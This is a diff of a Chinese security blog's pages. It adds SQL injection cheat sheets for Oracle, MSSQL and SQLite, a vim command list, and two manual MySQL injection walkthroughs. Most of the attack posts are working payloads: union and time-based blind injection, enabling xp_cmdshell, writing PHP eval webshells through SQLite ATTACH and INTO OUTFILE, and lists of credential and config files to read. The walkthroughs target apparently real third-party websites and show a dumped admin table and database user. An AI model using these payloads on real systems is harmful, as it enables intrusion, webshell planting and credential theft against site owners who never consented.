+<p>服务器操作系统：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select member from v<span class="variable">$logfile</span> <span class="built_in">where</span> rownum=1</span><br></pre></td></tr></table></figure></p>
+<p>服务器sid：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select instance_name fromv<span class="variable">$instance</span></span><br></pre></td></tr></table></figure></p>
+<p>当前连接用户：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select SYS_CONTEXT (<span class="string">'USERENV'</span>, <span class="string">'CURRENT_USER'</span>)from dual</span><br></pre></td></tr></table></figure></p>
+<p>获取数据库名：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select owner from all_tables <span class="built_in">where</span> rownum=1</span><br></pre></td></tr></table></figure></p>
+<p>依次爆出所有数据库名，假设第一个库名为first_dbname哪个第二个库select owner from all_tables where rownum=1 and owner&lt;&gt;’first_dbname’依次类推</p>
+<p>获取表名：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select table_name from user_tables <span class="built_in">where</span> rownum=1，依次爆出所有表类似暴库。</span><br></pre></td></tr></table></figure></p>
+<p>获取字段名：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select column_name from user_tab_columns <span class="built_in">where</span> table_name=<span class="string">'tablename'</span> and rownum=1</span><br></pre></td></tr></table></figure></p>
+<p>依次爆出所有字段类似暴库。</p>
+<h2 id="报错注入-2"><a href="#报错注入-2" class="headerlink" title="报错注入"></a>报错注入</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AND 2=UTL_INADDR.GET_HOST_ADDRESS(CHR(126)|(SLQ语句)|CHR(126))</span><br></pre></td></tr></table></figure>
+<h2 id="踩的一些坑"><a href="#踩的一些坑" class="headerlink" title="踩的一些坑"></a>踩的一些坑</h2><p>Oracle比较玄学，能用SQLmap绝不手工，但测试中总会遇到必须用手工的，比如xml中的一个参数注入(当然也可以写tamper脚本)，总结一下自己踩到的坑。</p>
+<h3 id="UNION每个字段类型必须相同"><a href="#UNION每个字段类型必须相同" class="headerlink" title="UNION每个字段类型必须相同"></a>UNION每个字段类型必须相同</h3><p>比如，原先的语句是这样：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,<span class="string">'2'</span>,<span class="string">'3'</span> from dual</span><br></pre></td></tr></table></figure></p>
+<p>那么后面的UNION也必须是int,char,char才行。</p>
+<p>可以通过下面方法确定各个字段的类型。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=2 union select <span class="string">'null'</span>,null,null,null,null,null from dual</span><br></pre></td></tr></table></figure></p>
+<p>如此依次将下面的每个null用单引号替换，查看返回页面，返回正常说明那个字段为字符型。确定所有字段类型后就可以注入了， 是字符型的就用’null’，数字型的就直接null</p>
+<h3 id="必须跟FROM"><a href="#必须跟FROM" class="headerlink" title="必须跟FROM"></a>必须跟FROM</h3><p>Oracle的每个查询必须跟from，Oracle本身有个虚拟表dual，测试的时候可以使用。</p>
+<h1 id="MSSQL"><a href="#MSSQL" class="headerlink" title="MSSQL"></a>MSSQL</h1><p>SQLserver也有点玄学，每个版本的系统内置表不一样，测试的时候很蛋疼。并且SQLserver的使用者参差不齐，网上回答很乱，有时间自己装上各个版本再专门总结。</p>
+<h2 id="常用信息及语句-2"><a href="#常用信息及语句-2" class="headerlink" title="常用信息及语句"></a>常用信息及语句</h2><p>数据库版本：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select @@VERSION</span><br></pre></td></tr></table></figure></p>
+<p>数据库名：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select db_name()</span><br></pre></td></tr></table></figure></p>
+<p>数据库ip地址：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select local_net_address from sys.dm_exec_connextions <span class="built_in">where</span> Session_id=@@spid</span><br></pre></td></tr></table></figure></p>
+<p>暴当前表中的列：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">article.asp?id=6 group by admin.username having 1=1--</span><br><span class="line"></span><br><span class="line">article.asp?id=6 group by admin.username,admin.password having 1=1--</span><br></pre></td></tr></table></figure></p>
+<p>暴任意表和列：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and (select top 1 name from (select top N id,name from sysobjects <span class="built_in">where</span> xtype=char(85)) T order by id desc)&gt;1</span><br><span class="line"></span><br><span class="line">and (select top col_name(object_id(<span class="string">'admin'</span>),N) from sysobjects)&gt;1</span><br></pre></td></tr></table></figure></p>
+<p>暴数据库数据：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select top 1 password from admin <span class="built_in">where</span> id=N)&gt;1</span><br></pre></td></tr></table></figure></p>
+<h2 id="报错注入-3"><a href="#报错注入-3" class="headerlink" title="报错注入"></a>报错注入</h2><p>MSSQL一般使用类型转换导致的报错注入</p>
+<h2 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;<span class="built_in">declare</span> @d int //是否支持多行</span><br></pre></td></tr></table></figure>
+<p>如果支持多行语句执行并且是sa权限可以直接执行系统命令。</p>
+<p>开启xp_cmdshell:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure <span class="string">'show advanced options'</span>, 1;</span><br><span class="line">RECONFIGURE;</span><br><span class="line">EXEC sp_configure<span class="string">'xp_cmdshell'</span>, 1;</span><br><span class="line">RECONFIGURE;</span><br><span class="line">``` </span><br><span class="line">关闭xp_cmdshell:</span><br><span class="line">```bash</span><br><span class="line">EXEC sp_configure <span class="string">'show advanced options'</span>, 1;</span><br><span class="line">RECONFIGURE;</span><br><span class="line">EXEC sp_configure<span class="string">'xp_cmdshell'</span>, 0;</span><br><span class="line">RECONFIGURE;</span><br></pre></td></tr></table></figure></p>
+<p>执行命令格式：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xp_cmdsehll(<span class="string">'whoami'</span>);</span><br></pre></td></tr></table></figure></p>
+<h1 id="SQLite"><a href="#SQLite" class="headerlink" title="SQLite"></a>SQLite</h1><h2 id="常用信息及语句-3"><a href="#常用信息及语句-3" class="headerlink" title="常用信息及语句"></a>常用信息及语句</h2><p>数据库版本：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select sqlite_version()</span><br></pre></td></tr></table></figure></p>
+<p>获取所有表名：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT name FROM sqlite_master WHERE <span class="built_in">type</span>=<span class="string">'table'</span></span><br></pre></td></tr></table></figure></p>
+<p>所有表结构(包含字段名，表名)：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT sql FROM sqlite_master WHERE <span class="built_in">type</span>=<span class="string">'table'</span></span><br></pre></td></tr></table></figure></p>
+<p>注释符：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--</span><br></pre></td></tr></table></figure></p>
+<p>盲注常用函数：substr()（没有mid、left等函数），判断长度函数length()</p>
+<h2 id="BOOL盲注-1"><a href="#BOOL盲注-1" class="headerlink" title="BOOL盲注"></a>BOOL盲注</h2><p>bool条件构造和MySQL一样，但是亦或运算的Payload不可用，注释符使用–。<br>逻辑判断目前我就翻到一个substr()，应用实例：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cond=<span class="string">'FALSE'</span> or (substr(<span class="string">'abc'</span>,1,1)=<span class="string">'a'</span>)</span><br></pre></td></tr></table></figure></p>
+<h2 id="延时盲注-2"><a href="#延时盲注-2" class="headerlink" title="延时盲注"></a>延时盲注</h2><p>sqlite没有类似sleep()的函数，但有个函数randomblob(N)，生成N个任意字符，可以造成延时。</p>
+<p>SQLite没有if，可以使用case when … then …</p>
+<p>格式cond=’true’ AND 1=(case when (bool) then randomblob(100000000) else 0 end)<br>100000000个字符就有明显延时了。</p>
+<p>注意cond为真，并且不要有太多条数据，因为有一条数据就会执行一次randomblob(100000000)，如果数据很多的话，服务器直接挂了。可以首先判断一下数据量，再确定N的值，比如我这里有100多条数据，就可以 id=’’ or 1 AND 1=randomblob(1000000)这样，把N的值缩小100倍。灵活运用。</p>
+<p>运用实例：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">' or 1 and 1=(case when substr('</span>abc<span class="string">',1,1)='</span>a<span class="string">' then randomblob(1000000) else 0 end)--</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h2><p>需要直接访问数据库，或堆叠查询选项启用（默认关闭）<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">';ATTACH DATABASE '</span>/tmp/p0.php<span class="string">' AS p0;CREATE TABLE p0.shell (data text);INSERT INTO p0.shell (data) VALUES ('</span>&lt;?php <span class="built_in">eval</span>(<span class="variable">$_POST</span>[1]);?&gt;<span class="string">');--</span></span><br></pre></td></tr></table></figure></p>
+<p>root权限的话可以写计划任务和公钥，参考redis未授权访问利用。</p>
+<h2 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h2><p>只能用在Windows上，需要特殊配置。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load_extension(library_file,entry_point)</span><br></pre></td></tr></table></figure></p>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p>•<a href="http://www.yulegeyu.com/2017/04/16/%E5%BD%93%E8%A1%A8%E5%90%8D%E5%8F%AF%E6%8E%A7%E7%9A%84%E6%B3%A8%E5%85%A5%E9%81%87%E5%88%B0%E4%BA%86Describe%E6%97%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E6%83%85%E5%86%B5%E3%80%82/" target="_blank" rel="noopener">http://www.yulegeyu.com/2017/04/16/%E5%BD%93%E8%A1%A8%E5%90%8D%E5%8F%AF%E6%8E%A7%E7%9A%84%E6%B3%A8%E5%85%A5%E9%81%87%E5%88%B0%E4%BA%86Describe%E6%97%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E6%83%85%E5%86%B5%E3%80%82/</a><br>•<a href="http://mutepig.club/?reqp=1&amp;reqr=" target="_blank" rel="noopener">http://mutepig.club/?reqp=1&amp;reqr=</a></p>
+
+        
+        
+        <p class="article-more-link">
+          
+       </p>
+    </div>
+    <footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/渗透测试/">渗透测试</a>►<a class="article-category-link" href="/categories/渗透测试/注入/">注入</a>
+</div>
+
+
+</div>
+
+
+
+
+<div class="comments-count">
+	
+</div>
+
+</footer>
+
+
+    </article>
+
+
+
+
+
+
+   
+    
+    <article class="post-expand post" itemprop="articleBody"> 
+        <header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2018/04/20/vim常用命令总结/" title="vim常用命令总结" itemprop="url">vim常用命令总结</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="小虫" target="_blank" itemprop="author">小虫</a>
+		
+  <p class="article-time">
+    <time datetime="2018-04-20T01:47:03.000Z" itemprop="datePublished"> 发表于 2018-04-20</time>
+    
+  </p>
+</header>
+    <div class="article-content">
+        
+        <p>为了方便查找，所以只介绍一些我自己经常用到的命令<br>在命令行中输入vim,进入vim编辑器<br>1,<b>i</b><br>按一下i键，下端显示–INSERT–</p>
+<p>2，<b>Esc</b><br>推出i（插入）命令进行其他命令使用<br>3,<b>:r filename</b><br>读入一个文件内容，并写入到当前编辑器中<br>4,<b>:w</b><br>在编辑的过程中保存文件，相当与于word中的ctrl+s<br>5,<b>:w newfilename</b><br>将该编辑器中的内容写到一个新的文件中<br>6,<b>:！ command</b><br>暂时离开vi到指令列模式下执行command 的显示结果！<br>7,<b>:!ls</b><br>在编辑的过程中执行 shll 命令ls<br>8,:<b>sh</b><br>进入shll命令行，执行完命令后ctrl+d退出重新进入vim编辑继续编辑在shell命令下，执行ctral+l 完成清屏<br>9,<b>:wq</b><br>保存文件并且退出<br>10,<b>ZZ</b><br>保存文件并退出，同上一个命令，注意大写<br>11,<b>q!</b><br>强制退出，不保存<br>12,<b>:set number或者：set nu</b><br>使用编辑器中的文件显示行号<br>13,<b>set nonumber或者:set nonu</b><br>与上一条命令相反，不显示行号<br>14,<b>:help i</b><br>查看插入命令帮助<br>15,<b>u</b><br>撤销上一步操作<br>16，<b>vim + filename</b><br>进行文件最后一行进行编辑<br>16,<b>vim + n filename</b><br>进入文件第n行进行编辑<br>17,<b>/text</b><br>在文件中向前查找text<br>18,<b>?text</b><br>在文件中向后查找text</p>
+
+        
+        
+        <p class="article-more-link">
+          
+       </p>
+    </div>
+    <footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/linux/">linux</a>►<a class="article-category-link" href="/categories/linux/工具/">工具</a>
+</div>
+
+
+</div>
+
+
+
+
+<div class="comments-count">
+	
+</div>
+
+</footer>
+
+
+    </article>
+
+
+
+
+
+
+   
+    
+    <article class="post-expand post" itemprop="articleBody"> 
+        <header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2018/03/28/PHP手工注入笔记 /" title="PHP手工注入笔记" itemprop="url">PHP手工注入笔记</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="小虫" target="_blank" itemprop="author">小虫</a>
+		
+  <p class="article-time">
+    <time datetime="2018-03-28T08:42:19.000Z" itemprop="datePublished"> 发表于 2018-03-28</time>
+    
+  </p>
+</header>
+    <div class="article-content">
+        
+        <p> PHP手工注入笔记，整理了一下，自己觉得挺仔细的！</p>
 <p>一.</p>
-<p>检测字段长度<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.osy-wine.com/news_show.php?id=-61 order by 24</span><br></pre></td></tr></table></figure></p></div><p class="readmore"><a href="/2018/03/28/PHP手工注入笔记 /">阅读全文</a></p></div><div class="post"><h1 class="post-title"><a href="/2018/03/27/mysql手工注入之load_file()应用/">mysql手工注入之load_file()应用</a></h1><div class="post-meta">2018-03-27</div><div class="post-content"><p>and (select count(<em>) from mysql.user)&gt;0/</em><br>判断权限<br>如果结果返回正常,那么就是具有读写权限了.我们就可以用这个函数去读取系统的敏感文件,去寻找配置文件,寻找数据库连接文件,寻找社工文件,寻找WEB物理路径等等.下面,我给大家总结出了敏感文件列表:</p></div><p class="readmore"><a href="/2018/03/27/mysql手工注入之load_file()应用/">阅读全文</a></p></div><div class="post"><h1 class="post-title"><a href="/2018/02/28/渗透过程中总结的一些技巧/">PHP手工注入笔记</a></h1><div class="post-meta">2018-02-28</div><div class="post-content"><p>1.利用网站过滤不严直接绕过后台验证，在网站后面加上 admin/session.asp 或 admin/left.asp</p>
+<p>检测字段长度<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.osy-wine.com/news_show.php?id=-61 order by 24</span><br></pre></td></tr></table></figure></p>
+<p>报错  说明字段长度是24</p>
+<p>查看数据库信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://www.osy-wine.com/news_show.php?id=-61+union+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24</span><br><span class="line">http://www.osy-wine.com/news_show.php?id=-61+union+select+1,user(),3,4,database(),version(),7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24</span><br><span class="line">user() ----------osywine@115.160.154.39</span><br><span class="line">version()--------5.0.91-log   版本</span><br></pre></td></tr></table></figure></p>
+<p>5.0以上的版本都带有一个information_schema的虚拟库里面存放的是所有库的信息.</p>
+<p>database()——-osywine</p>
+<p>二.<br>利用虚拟库information_schema 报表<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.osy-wine.com/news_show.php?id=-61+union+select+1,table_name,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24+from+information_schema.tables+where+table_schema=0x6F737977696E65+limit+1,1</span><br></pre></td></tr></table></figure></p>
+<p>0x6F737977696E65 是osywine 16进制     0x6F737977696E6520<br>在添加limit+0,1 limit+1,1 limit+0,1 查询下一个<br>爆出admin这张表</p>
+<p>三.<br>利用表爆字段<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.osy-wine.com/news_show.php?id=-61+union+select+1,column_name,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24+from+information_schema.columns+where+table_name=0x61646D696E</span><br></pre></td></tr></table></figure></p>
+<p>爆出id<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.osy-wine.com/news_show.php?id=-61+union+select+1,column_name,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24+from+information_schema.columns+where+table_name=0x61646D696E+limit+1,1</span><br></pre></td></tr></table></figure></p>
+<p>爆出username<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.osy-wine.com/news_show.php?id=-61+union+select+1,column_name,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24+from+information_schema.columns+where+table_name=0x61646D696E+limit+2,1</span><br></pre></td></tr></table></figure></p>
+<p>爆出password<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.osy-wine.com/news_show.php?id=-61+union+select+1,username,3,4,password,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24+from+admin</span><br></pre></td></tr></table></figure></p>
+<p>直接爆用户密码</p>
+<hr>
+<p>第二种方法（比较方便，速度）<br>一次性报爆表<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.osy-wine.com/news_show.php?id=-61+union+select+1,2,3,4,GROUP_CONCAT(DISTINCT+table_name),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24+from+information_schema.columns+where+table_schema=0x6F737977696E65</span><br></pre></td></tr></table></figure></p>
+<p>0x6F737977696E65   是16进制的osywine<br>所有的表如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aboutweb,admin,blog,ggao,liuyan,member,news,news_class,news_class2,photo,photo_class,products,products_class,products_class2,settle_accounts,shoping,youqinglj</span><br></pre></td></tr></table></figure></p>
+<p>一次性爆出所有字段<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.osy-wine.com/news_show.php?id=-61+union+select+1,2,3,4,GROUP_CONCAT(DISTINCT+column_name),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24+from+information_schema.columns+where+table_name=0x61646D696E</span><br></pre></td></tr></table></figure></p>
+<p>0x61646D696E 是admin的16进制<br>所有字段如下；<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id,username,password</span><br></pre></td></tr></table></figure></p>
+<p>接下来就是最后一步。。。用户名和密码直接暴出。。。。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.osy-wine.com/news_show.php?id=-61+union+select+1,2,3,4,GROUP_CONCAT(DISTINCT+username,0x5f,password),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24+from+admin</span><br></pre></td></tr></table></figure></p>
+<p>注:这里面所有的+号是代替空格的，还可以用/**/来代替,不同情况，不同分析！</p>
+
+        
+        
+        <p class="article-more-link">
+          
+       </p>
+    </div>
+    <footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/渗透测试/">渗透测试</a>►<a class="article-category-link" href="/categories/渗透测试/注入/">注入</a>
+</div>
+
+
+</div>
+
+
+
+
+<div class="comments-count">
+	
+</div>
+
+</footer>
+
+
+    </article>
+
+
+
+
+
+
+   
+    
+    <article class="post-expand post" itemprop="articleBody"> 
+        <header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2018/03/27/mysql手工注入之load_file()应用/" title="mysql手工注入之load_file()应用" itemprop="url">mysql手工注入之load_file()应用</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="小虫" target="_blank" itemprop="author">小虫</a>
+		
+  <p class="article-time">
+    <time datetime="2018-03-27T08:42:19.000Z" itemprop="datePublished"> 发表于 2018-03-27</time>
+    
+  </p>
+</header>
+    <div class="article-content">
+        
+        <p>and (select count(<em>) from mysql.user)&gt;0/</em><br>判断权限<br>如果结果返回正常,那么就是具有读写权限了.我们就可以用这个函数去读取系统的敏感文件,去寻找配置文件,寻找数据库连接文件,寻找社工文件,寻找WEB物理路径等等.下面,我给大家总结出了敏感文件列表:</p>
+<p>找phpinfo()文件<br>php_info.php info.php test.php mysql.php phpinfo.php</p>
+<p>敏感信息<br>MYSQL注入中，load_file()函数在获得webshell以及提权过程中起着十分重要的作用，常被用来读取各种配置文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/app/apache2/conf/httpd.conf //apache2缺省配置文件</span><br><span class="line">/usr/local/apache2/conf/httpd.conf</span><br><span class="line">/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置</span><br><span class="line">/usr/local/app/php5/lib/php.ini //PHP相关设置</span><br><span class="line">/etc/sysconfig/iptables //从中得到防火墙规则策略</span><br><span class="line">/etc/httpd/conf/httpd.conf // apache配置文件</span><br><span class="line">/etc/rsyncd.conf //同步程序配置文件</span><br><span class="line">/etc/sysconfig/network-scripts/ifcfg-eth0 //查看IP.</span><br><span class="line">/etc/my.cnf //mysql的配置文件</span><br><span class="line">/etc/redhat-release //系统版本</span><br><span class="line">/etc/issue</span><br><span class="line">/etc/issue.net</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">c:\mysql\data\mysql\user.MYD //存储了mysql.user表中的数据库连接密码</span><br><span class="line">c:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.ini //存储了虚拟主机网站路径和密码</span><br><span class="line">c:\Program Files\Serv-U\ServUDaemon.ini</span><br><span class="line">c:\windows\my.ini //MYSQL配置文件</span><br><span class="line">c:\windows\system32\inetsrv\MetaBase.xml //IIS配置文件</span><br></pre></td></tr></table></figure>
+<p>等等。实际上，load_file()的作用不止于此，它还可以用来读取系统中的二进制文件，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">c:\windows\repair\sam //存储了WINDOWS系统初次安装的密码</span><br><span class="line">c:\Program Files\ Serv-U\ServUAdmin.exe //6.0版本以前的serv-u管理员密码存储于此</span><br><span class="line">c:\Program Files\RhinoSoft.com\ServUDaemon.exe</span><br><span class="line">C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere\*.cif文件</span><br><span class="line">//存储了pcAnywhere的登陆密码</span><br></pre></td></tr></table></figure></p>
+<p>演示站点<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http://www.cqxiaoma.com</span><br><span class="line">&lt;?php @eval($_POST[&apos;pass&apos;]);?&gt;</span><br><span class="line">info outfile</span><br><span class="line"></span><br><span class="line">http://www.cqxiaoma.com/pageNews.php?sid=18&amp;nid=37%20order%20by%2011</span><br><span class="line">http://www.cqxiaoma.com/pageNews.php?sid=18&amp;nid=-37%20union%20select%201,2,user(),4,5,6,7,8,9,10,11</span><br><span class="line">view-source:http://www.cqxiaoma.com/pageNews.php?sid=20&amp;nid=71%20and%201=2%20union%20select%201,2,load_file(0x2F6574632F68747470642F636F6E662F68747470642E636F6E66),4,5,6,7,8,9,10,11</span><br></pre></td></tr></table></figure></p>
+<p>找phpinfo()文件<br>php_info.php info.php test.php mysql.php phpinfo.php  得到网站物理路径<br>没有过滤单引号 具有写权限  得到网站物理路径</p>
+<p>读/etc/httpd/conf/httpd.conf 找到网站物理路径 好实施，嘿嘿。</p>
+<p>提交非法字符报错 找到网站物理路径 好实施，嘿嘿<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/var/www/html/cqxiaoma/www/new/info.php</span><br><span class="line"></span><br><span class="line">/var/www/html/cqxiaoma/www/new/2.jpg</span><br></pre></td></tr></table></figure></p>
+<p>上传图片<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">load_file(图片路径) into outfile &apos;路径&apos;</span><br><span class="line"></span><br><span class="line">load_file(/var/www/html/cqxiaoma/www/new/2.jpg) into outfile &apos;/var/www/html/cqxiaoma/www/new/info1.php&apos;</span><br><span class="line">0x3C3F70687020406576616C28245F504F53545B2770617373275D293B3F3E 或者&apos;&lt;?php @eval($_POST[&apos;pass&apos;]);?&gt;&apos;</span><br></pre></td></tr></table></figure></p>
+<p><a href="http://www.cqxiaoma.com/pageNews.php?sid=20&amp;nid=71%20and%201=2%20union%20select%201,2,0x3C3F70687020406576616C28245F504F53545B2770617373275D293B3F3E,4,5,6,7,8,9,10,11" target="_blank" rel="noopener">http://www.cqxiaoma.com/pageNews.php?sid=20&amp;nid=71%20and%201=2%20union%20select%201,2,0x3C3F70687020406576616C28245F504F53545B2770617373275D293B3F3E,4,5,6,7,8,9,10,11</a> into outfile ‘/var/www/html/cqxiaoma/www/new/upload/1.php’</p>
+<p><a href="http://www.cqxiaoma.com/pageNews.php?sid=20&amp;nid=-53" target="_blank" rel="noopener">http://www.cqxiaoma.com/pageNews.php?sid=20&amp;nid=-53</a> union select 1,2,0x3C3F70687020406576616C28245F504F53545B2770617373275D293B3F3E,4,5,6,7,8,9,10,11 into outfile ‘/var/www/html/cqxiaoma/www/new/upload/xt1.php’</p>
+
+        
+        
+        <p class="article-more-link">
+          
+       </p>
+    </div>
+    <footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/渗透测试/">渗透测试</a>►<a class="article-category-link" href="/categories/渗透测试/注入/">注入</a>
+</div>
+
+
+</div>
+
+
+
+
+<div class="comments-count">
+	
+</div>
+
+</footer>
+
+
+    </article>
+
+
+
+
+
+
+   
+    
+    <article class="post-expand post" itemprop="articleBody"> 
+        <header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2018/02/28/渗透过程中总结的一些技巧/" title="PHP手工注入笔记" itemprop="url">PHP手工注入笔记</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="小虫" target="_blank" itemprop="author">小虫</a>
+		
+  <p class="article-time">
+    <time datetime="2018-02-28T08:42:19.000Z" itemprop="datePublished"> 发表于 2018-02-28</time>
+    
+  </p>
+</header>
